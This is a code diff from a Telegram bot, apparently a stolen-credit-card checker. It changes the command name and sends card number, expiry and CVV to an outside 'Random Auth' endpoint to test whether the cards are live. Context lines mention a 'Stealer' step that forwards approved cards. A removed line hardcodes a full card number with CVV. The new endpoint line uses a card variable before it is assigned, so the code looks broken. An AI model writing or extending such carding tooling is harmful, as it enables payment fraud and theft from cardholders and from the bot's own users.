@@ -22,14 +22,14 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("rda", [".", "/"]))
+@Client.on_message(filters.command("ra", [".", "/"]))
 async def random_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
 
         gateway = "Random Auth 🎲"
-        endpoint_url = "https://onyxenvbot.up.railway.app/random/key=yashikaaa/cc=4100400157539308|08|2026|126"
+        endpoint_url = f"https://onyxenvbot.up.railway.app/random/key=yashikaaa/cc={fullcc}"
 
         if checkall[0] == False:
             return
@@ -37,7 +37,7 @@ async def random_auth_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /rda\n\nMessage: No CC Found in your input ❌\n\nUsage: /randomauth cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /ra\n\nMessage: No CC Found in your input ❌\n\nUsage: /ra cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
